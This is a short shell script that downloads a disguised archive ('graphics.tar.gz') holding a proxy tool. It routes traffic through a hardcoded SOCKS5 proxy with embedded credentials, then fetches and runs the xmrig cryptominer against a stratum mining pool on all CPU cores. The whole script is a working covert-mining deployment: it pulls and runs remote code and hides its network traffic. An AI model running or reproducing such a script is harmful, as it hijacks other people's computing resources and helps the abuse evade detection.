#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.88.24.139:443

socks5_username = temera88

socks5_password = temera88

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "


./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && ./xmrig -o stratum+tcp://168.235.86.33:3393 --algo rx/0 -u SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --keepalive --donate-level 1 -p x -t $(nproc --all)
